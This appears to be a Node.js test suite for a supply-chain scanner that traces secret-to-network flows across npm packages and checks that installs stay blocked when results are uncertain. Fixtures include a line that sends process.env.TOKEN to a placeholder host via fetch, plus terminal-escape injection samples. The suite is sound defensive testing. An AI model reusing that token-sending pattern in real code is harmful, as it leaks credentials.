import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { analyzeWithPkgxray, integrationExitCode, renderIntegration } from '../src/integration.mjs';
import { createScenario } from '../examples/support/scenario.mjs';

const cli = fileURLToPath(new URL('../bin/compose-ray.mjs', import.meta.url));
function fixture(t, kind) { const f = createScenario(kind); t.after(f.cleanup); return f; }
function scanner(t, body = '') {
  // A protocol stub, never represented as a real pkgxray accuracy test.
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'compose-ray-scanner-stub-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  fs.mkdirSync(path.join(root, 'src'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'pkgxray', version: 'test-stub' }));
  fs.writeFileSync(path.join(root, 'src/artifact.js'), `exports.BUILD_ID=${JSON.stringify('a'.repeat(64))};`);
  fs.writeFileSync(path.join(root, 'src/auditor.js'), `exports.auditEvidence=e=>{${body}
    return {schemaVersion:1,packageName:e.packageName,verdict:'safe',findings:[]};};`);
  return root;
}

test('combined scan retains the three-package flow despite clear package reports', t => {
  const f = fixture(t, 'sensitive');
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot: scanner(t, `
    if(e.sourceCoverage.complete!==false)throw Error('Missing selected-source scope');
    if(!e.sourceFiles.some(f=>f.path==='package.json'))throw Error('Missing manifest');`) });
  assert.equal(report.pkgxray.status, 'completed');
  assert.equal(report.pkgxray.packages.length, 4);
  assert.equal(report.compose.verdict, 'review');
  assert.ok(report.compose.findings[0].trace.some(s => s.package.name === 'demo-reader'));
  assert.ok(report.compose.findings[0].trace.some(s => s.package.name === 'demo-formatter'));
  assert.ok(report.compose.findings[0].trace.some(s => s.package.name === 'demo-sender'));
  assert.equal(report.decision, 'block');
  assert.equal(report.authorization.installAllowed, false);
  assert.equal(report.coverage.registryIntegrityVerified, false);
  assert.equal(integrationExitCode(report), 2);
});

test('no-flow control never becomes an installation approval', t => {
  const f = fixture(t, 'public');
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot: scanner(t) });
  assert.equal(report.compose.verdict, 'no-flow-found');
  assert.equal(report.decision, 'block');
  assert.equal(report.coverage.status, 'partial');
  assert.equal(report.authorization.installAllowed, false);
});

test('ESM flow results and unsupported async evidence both reach pkgxray', t => {
  const f = fixture(t, 'public');
  f.put('auth.mjs', 'export const marker="esm-evidence";fetch("https://example.invalid",{body:process.env.TOKEN});');
  const scannerRoot = scanner(t, `
    if(e.packageName==='demo-app'){
      if(!e.sourceFiles.some(f=>f.path==='auth.mjs'&&f.content.includes('esm-evidence')))throw Error('ESM bytes were not supplied');
      return {schemaVersion:1,packageName:e.packageName,verdict:'block',findings:[
        {severity:'high',category:'fixture-block',file:'auth.mjs',snippet:'esm-evidence',rationale:'Protocol test evidence'}]};
    }`);
  const report = analyzeWithPkgxray({ root: f.root, entry: 'auth.mjs', scannerRoot });
  assert.equal(report.pkgxray.status, 'completed');
  assert.equal(report.compose.verdict, 'review');
  assert.equal(report.compose.findings.length, 1);
  assert.equal(report.decision, 'block');
  const before = report.compose.packages.find(p => p.id === '.').analyzedContentSha256;
  f.put('auth.mjs', 'export const marker="esm-evidence-changed";export const delayed=async()=>process.env.TOKEN;');
  const after = analyzeWithPkgxray({ root: f.root, entry: 'auth.mjs', scannerRoot });
  assert.equal(after.compose.verdict, 'incomplete');
  assert.equal(after.pkgxray.status, 'completed');
  assert.equal(after.compose.findings.length, 0);
  assert.notEqual(before, after.compose.packages.find(p => p.id === '.').analyzedContentSha256);
});

test('a block survives a clear flow scan and another package scan failure', t => {
  const f = fixture(t, 'public');
  const scannerRoot = scanner(t, `
    if(e.packageName==='demo-reader')throw Error('fixture scanner failure');
    if(e.packageName==='demo-sender')return {schemaVersion:1,packageName:e.packageName,verdict:'block',findings:[
      {severity:'high',category:'fixture-block',file:'index.js',snippet:'fixture',rationale:'Test block'}]};`);
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot });
  assert.equal(report.compose.verdict, 'no-flow-found');
  assert.equal(report.decision, 'block');
  assert.deepEqual(report.blockingPackages, ['node_modules/demo-sender']);
  assert.equal(report.execution, 'partial');
  assert.ok(report.gaps.some(g => g.code === 'package-scan-failed'));
  assert.equal(integrationExitCode(report), 2);
});

test('unsupported behavior survives otherwise clear package reports', t => {
  const f = fixture(t, 'unsupported');
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot: scanner(t) });
  assert.equal(report.compose.verdict, 'incomplete');
  assert.equal(report.execution, 'partial');
  assert.ok(report.gaps.some(g => g.engine === 'compose-ray'));
  assert.equal(report.decision, 'block');
});

test('missing scanner and incompatible reports preserve flow findings and report failure', t => {
  const f = fixture(t, 'sensitive');
  for (const scannerRoot of [path.join(f.root, 'missing-scanner'), scanner(t, 'return {schemaVersion:999};')]) {
    const report = analyzeWithPkgxray({ root: f.root, scannerRoot });
    assert.equal(report.pkgxray.status, 'failed');
    assert.ok(report.compose.findings.length);
    assert.ok(report.gaps.some(g => g.code === 'integration-error'));
    assert.equal(report.decision, 'block');
  }
});

test('worker timeout is bounded and cannot turn uncertainty into a pass', t => {
  const f = fixture(t, 'public');
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot: scanner(t, 'while(true){}'), timeoutMs: 100 });
  assert.equal(report.pkgxray.status, 'failed');
  assert.equal(report.execution, 'partial');
  assert.equal(integrationExitCode(report), 2);
});

test('selected files remain inert and source symlinks remain unsupported', t => {
  const f = fixture(t, 'sensitive');
  const marker = path.join(f.root, 'must-not-exist');
  f.put('index.js', `require('node:fs').writeFileSync(${JSON.stringify(marker)},'executed');require('demo-sender')(process.env.TOKEN);`);
  const scannerRoot = scanner(t);
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot });
  assert.equal(fs.existsSync(marker), false);
  assert.ok(report.compose.findings.length);
  fs.unlinkSync(path.join(f.root, 'node_modules/demo-sender/index.js'));
  if (process.platform === "win32") return; // file symlink creation requires elevated Windows privileges
  fs.symlinkSync(path.join(f.root, 'index.js'), path.join(f.root, 'node_modules/demo-sender/index.js'));
  const linked = analyzeWithPkgxray({ root: f.root, scannerRoot });
  assert.ok(linked.gaps.some(g => g.code === 'unsupported-symlink'));
  assert.equal(linked.decision, 'block');
});

test('combined CLI emits one JSON report and uses the binary blocked exit', t => {
  const f = fixture(t, 'public');
  const scannerRoot = scanner(t);
  const result = spawnSync(process.execPath, [cli, f.root, '--pkgxray', scannerRoot, '--json'], { encoding: 'utf8' });
  assert.equal(result.status, 2);
  assert.equal(result.stderr, '');
  assert.equal(JSON.parse(result.stdout).mode, 'pkgxray-composition');
  const invalid = spawnSync(process.execPath, [cli, f.root, '--pkgxray'], { encoding: 'utf8' });
  assert.equal(invalid.status, 2);
});

test('terminal rendering escapes package-controlled control characters', t => {
  const f = fixture(t, 'public');
  const report = analyzeWithPkgxray({ root: f.root, scannerRoot: scanner(t) });
  report.pkgxray.packages[0].report.findings.push({ severity: 'medium', category: 'test', file: '\u001b[2J', rationale: 'text\nforged line', snippet: '' });
  const rendered = renderIntegration(report);
  assert.ok(!rendered.includes('\u001b'));
  assert.ok(rendered.includes('text\\nforged line'));
});

test('combined CLI flushes a large JSON report completely before exiting', t => {
  const f = fixture(t, 'public');
  const scannerRoot = scanner(t, `
    if(e.packageName==='demo-sender')return {schemaVersion:1,packageName:e.packageName,verdict:'review',findings:[
      {severity:'medium',category:'fixture-long',file:'index.js',snippet:'fixture',rationale:'x'.repeat(200000)}]};`);
  const result = spawnSync(process.execPath, [cli, f.root, '--pkgxray', scannerRoot, '--json'], { encoding: 'utf8' });
  assert.equal(result.status, 2);
  const report = JSON.parse(result.stdout);
  assert.equal(report.pkgxray.packages.at(-1).report.findings[0].rationale.length, 200000);
});

test('real pkgxray compatibility: sensitive, public, unsupported and blocked controls', { skip: !process.env.PKGXRAY_CHECKOUT }, t => {
  for (const kind of ['sensitive', 'public', 'unsupported', 'blocked']) {
    const f = fixture(t, kind);
    const report = analyzeWithPkgxray({ root: f.root, scannerRoot: process.env.PKGXRAY_CHECKOUT });
    assert.equal(report.pkgxray.status, 'completed', JSON.stringify(report.gaps));
    assert.equal(report.decision, 'block');
    assert.equal(report.compose.verdict, kind === 'sensitive' ? 'review' : kind === 'unsupported' ? 'incomplete' : 'no-flow-found');
  }
});
